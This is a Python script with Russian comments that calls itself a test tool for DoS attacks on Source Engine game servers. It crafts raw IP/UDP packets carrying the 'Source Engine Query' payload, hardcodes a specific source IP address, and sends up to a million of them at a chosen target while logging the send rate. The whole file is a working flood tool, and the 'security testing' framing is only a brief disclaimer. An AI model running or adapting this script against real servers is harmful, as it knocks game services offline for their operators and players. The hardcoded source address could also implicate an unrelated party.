# Тестовый скрипт для DOS-атаки Source Engine Query запросами для тестирования безопасности серверов.
# Скрипт используется только на свой страх и риск.
# Для запуска требуется python3 и установленный pip. Требуется модуль struct;
#!/usr/bin/env python3
import socket
import struct
import random
import time
import errno
import argparse

def parse_args():
    parser = argparse.ArgumentParser(description="UDP Spoofing Tool for Source Engine Query")
    parser.add_argument("target_ip", help="IP-адрес цели")
    parser.add_argument("target_port", type=int, help="Порт цели")
    parser.add_argument("-c", "--count", type=int, default=1000000, help="Количество пакетов (по умолчанию 1 млн)")
    parser.add_argument("--log-every", type=int, default=10000, help="Логировать каждый N-ный пакет")
    parser.add_argument("--debug-packets", type=int, default=5, help="Сохранить первые N пакетов для диагностики")
    return parser.parse_args()

QUERY_PACKET = b'\xff\xff\xff\xff\x54Source Engine Query\x00'
UDP_LENGTH = 8 + len(QUERY_PACKET)  # Длина UDP заголовка + Payload

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
sock.setblocking(False)

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff

def create_packet(target_ip, target_port):
    src_ip = socket.inet_aton("85.234.100.61")  # Реальный исходящий IP
    dst_ip = socket.inet_aton(target_ip)
    total_length = 20 + UDP_LENGTH
    ip_id = random.randint(0, 65535)
    ip_header = struct.pack("!BBHHHBBH4s4s",
                            0x45, 0, total_length, ip_id, 0x4000,
                            64, socket.IPPROTO_UDP, 0, src_ip, dst_ip)
    ip_chksum = checksum(ip_header)
    ip_header = ip_header[:10] + struct.pack("!H", ip_chksum) + ip_header[12:]
    udp_src_port = random.randint(1024, 65535)
    udp_header = struct.pack("!HHHH", udp_src_port, target_port, UDP_LENGTH, 0)
    pseudo_header = src_ip + dst_ip + struct.pack("!BBH", 0, socket.IPPROTO_UDP, UDP_LENGTH)
    udp_checksum_data = pseudo_header + udp_header + QUERY_PACKET
    udp_chksum = checksum(udp_checksum_data)
    udp_header = struct.pack("!HHHH", udp_src_port, target_port, UDP_LENGTH, udp_chksum)
    return ip_header + udp_header + QUERY_PACKET

def send_packets(target_ip, target_port, packet_count, log_every, debug_packets):
    start_time = time.time()
    sent, error_count = 0, 0
    debug_dump = []
    
    for i in range(packet_count):
        packet = create_packet(target_ip, target_port)
        while True:
            try:
                sock.sendto(packet, (target_ip, 0))
                sent += 1
                if sent % log_every == 0:
                    elapsed = time.time() - start_time
                    pps = sent / elapsed if elapsed > 0 else 0
                    print(f"[INFO] {time.strftime('%H:%M:%S')} - Отправлено {sent} пакетов, {pps:.2f} PPS.")
                if len(debug_dump) < debug_packets:
                    debug_dump.append(packet)
                break
            except OSError as e:
                error_count += 1
                if e.errno == errno.ENOBUFS:
                    print("[WARNING] ENOBUFS: буфер переполнен. Ожидание...")
                    time.sleep(0.001)
                else:
                    print(f"[ERROR] Ошибка отправки пакета: {e} (errno {e.errno})")
                    break
    elapsed = time.time() - start_time
    print(f"\n[RESULT] Отправлено {sent} пакетов за {elapsed:.2f} сек. ({sent/elapsed:.2f} PPS)")
    print(f"[ERRORS] Количество ошибок: {error_count}")
    if debug_dump:
        print("\n[DEBUG] Hex-дамп первых пакетов:")
        for idx, pkt in enumerate(debug_dump):
            print(f"Пакет {idx+1}: {pkt.hex()}")

if __name__ == "__main__":
    args = parse_args()
    send_packets(args.target_ip, args.target_port, args.count, args.log_every, args.debug_packets)
